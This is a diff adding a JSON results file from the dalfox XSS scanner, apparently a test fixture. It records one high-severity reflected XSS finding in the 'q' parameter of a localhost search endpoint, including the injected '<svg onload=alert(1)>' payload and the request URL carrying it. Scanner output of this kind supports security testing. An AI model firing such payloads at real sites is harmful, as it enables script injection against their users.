@@ -1,0 +1,42 @@
+{
+  "findings": [
+    {
+      "confidence": "high",
+      "confidence_reason": "payload reached an executable position in the parsed response",
+      "cwe": "CWE-79",
+      "data": "http://127.0.0.1:8099/search?q=%3Csvg%20onload%3Dalert%281%29%20class%3Ddlx1bce23b4%3E",
+      "detection_method": "reflection",
+      "evidence": "DOM verification successful for param q (DOM marker)",
+      "inject_type": "inHTML",
+      "location": "Query",
+      "message_id": 606,
+      "message_str": "Triggered XSS Payload (DOM marker): q=<svg onload=alert(1) class=dlx1bce23b4>",
+      "method": "GET",
+      "param": "q",
+      "payload": "<svg onload=alert(1) class=dlx1bce23b4>",
+      "severity": "High",
+      "type": "V",
+      "type_description": "Vulnerable - dalfox asserts this input is exploitable; act on it"
+    }
+  ],
+  "meta": {
+    "dalfox_version": "3.2.4",
+    "dedup_mode": "exact",
+    "failed_requests": 0,
+    "findings_count": 1,
+    "incomplete": false,
+    "scan_duration_ms": 1522,
+    "target_summary": [
+      {
+        "findings_count": 1,
+        "status": "findings",
+        "target": "http://127.0.0.1:8099/search?q=hello"
+      }
+    ],
+    "targets": [
+      "http://127.0.0.1:8099/search?q=hello"
+    ],
+    "targets_deduplicated": 0,
+    "total_requests": 33
+  }
+}
